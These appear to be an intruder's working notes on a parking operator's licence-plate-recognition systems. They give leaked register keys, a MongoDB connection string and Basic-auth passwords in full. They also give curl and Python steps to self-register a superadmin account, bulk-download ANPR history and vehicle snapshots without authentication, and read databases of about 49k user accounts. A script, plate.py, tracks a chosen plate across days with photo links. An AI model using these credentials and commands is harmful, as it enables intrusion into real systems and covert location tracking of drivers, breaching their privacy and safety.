# Parking API — working notes and credentials

All endpoints below were executed live on 2026-11-14/15. Assume they change.

## Summary of access

| Surface | Auth | What it gives |
|---|---|---|
| `https://district8.lpr-capture.alfabeta.co.id` | **none** | ANPR history + original JPEG snapshots |
| `http://52.74.58.117:8602` | **none** | Parking sessions (plate, gates, times, camera IPs) |
| `http://52.74.58.117:9110` | JWT, but **self-registration with a leaked key** | Location inventory, sessions, capture API |
| `mongodb://52.74.58.117:47251` | password | Full LPR database incl. users and history |
| `http://52.74.58.117:49110` | HTTP Basic | Internal analytics dashboard, ~49k accounts |
| `http://52.74.58.117:42701` | none | Second LPR engine instance (GI), same interface |

## Credentials

```
register_key   d3f3c35c7fe7069267cdb146897968c960fec131
mongo DSN      mongodb://alfabeta:Alfabeta43B!@52.74.58.117:47251/?authSource=admin
basic auth     alfabeta:Alfabeta43B!      (lpr-analytics /api/minio, /api/report)
```

Register a role of your choosing — the role is attacker-supplied, and `permissions` need only be non-empty:

```bash
curl -s -X POST http://52.74.58.117:9110/api/v1/auth/register_v2 \
  -H 'Content-Type: application/json' \
  -d '{"username":"me1","password":"Str0ngPass1","role":"superadmin",
       "permissions":["all"],"register_key":"d3f3c35c7fe7069267cdb146897968c960fec131"}'
# -> {"data":{"access_token":"eyJ..."}}   role=superadmin, /location returns all 199 lots
```

## 1. ANPR history (anonymous)

```bash
curl -sk "https://district8.lpr-capture.alfabeta.co.id/history-gates?startDate=2026-11-08&endDate=2026-11-09"
```

- `startDate` / `endDate` are `YYYY-MM-DD` and **endDate is exclusive** — a same-day window returns `[]`. Always pass D and D+1.
- One day ≈ 5-30 MB, 7k-49k records. There is no server-side plate filter; filter client-side.
- Record shape:

```json
{"id":13674454,"type_in":"CAR","image_in":"/snapshot/GABM2-REV_B2643BBO_..._2026-11-08T07:12:09.jpg",
 "date_in":"2026-11-08T00:12:09.000Z","plate_in":"B2643BBO","gate_in":"GABM2-REV",
 "image_out":"/snapshot/GABK2-REV_B2643BBO_..._2026-11-09T20:50:57.jpg",
 "date_out":"2026-11-09T13:50:57.000Z","plate_out":"B2643BBO","gate_out":"GABK2-REV"}
```

- `date_out` absent = still in, or exit not detected.
- Timestamps are UTC; local Jakarta = +7.

## Snapshots

```bash
curl -sk -o p.jpg "https://district8.lpr-capture.alfabeta.co.id/snapshot/B2CM4_B6366SXT_....jpg"
# 200 image/jpeg, 640x360 or 1280x720
```

Path comes from `image_in` / `image_out` verbatim. Anything not in `image_in|image_out` can be probed, but the recorded path is authoritative.

## 2. Session report (anonymous)

```bash
curl -s -X POST http://52.74.58.117:8602/external/v1/report/summary-lpr \
  -H 'Content-Type: application/json' \
  -d '{"startDate":"2026-11-13T00:00:00.000Z","endDate":"2026-11-13T23:59:00.000Z"}'
```

- ISO timestamps, not dates. Same-day is allowed here (unlike the engine).
- ~7.6k records/day, ~6.7 MB.
- Fields: `parkingSlipNumber`, `vehiclePlateNumber`, `checkinTime`, `checkoutTime`, `entryDetected`, `exitDetected`, `parkingSlipType`, branch fields. `checkoutTime` null = open.

## 3. Authenticated API (9110)

```
GET  /api/v1/location                    199 lots, full inventory
GET  /api/v1/location/{id}/...           per-lot detail (authz gap: permissions checked only on the list route)
POST /api/v1/auth/register_v2            self-registration, role supplied
```

Send `Authorization: Bearer <access_token>` from step 0. `GET /api/v1/location` with a `superadmin` token returns the same bytes as the admin inventory.

## 4. MongoDB

```python
pymongo.MongoClient("mongodb://alfabeta:Alfabeta43B!@52.74.58.117:47251/?authSource=admin")
# databases: admin, alfabeta, config, cp_lpr_capture, local, lpr_parkee_analyzer, smart_meeting_room
# alfabeta.api_capture_history ~8.5k docs; alfabeta.users stores bcrypt hashes
# lpr_parkee_analyzer.users ~49k dashboard accounts
```

This is the corpus path: `api_capture_history` plus `cp_lpr_capture` hold history and image paths; the image bytes live on the object store, reached with the Basic pair above.

## Client

`plate.py` wraps 1 + 2, filters client-side, and prints hits with photo URLs:

```
./plate.py B2643BBO --days 8
./plate.py B2643BBO --json
```

## Caveats

- Data lags: on 2026-11-14 the engine had nothing after ~11-10; the report API was fresher.
- Volume: pull day by day, not in one window. Expect 429s if you hammer.
- `endDate` exclusivity will silently give you empty results — the classic way to think a plate is absent.
- Timestamps UTC; `date_out` missing is ambiguous (still inside vs missed read).
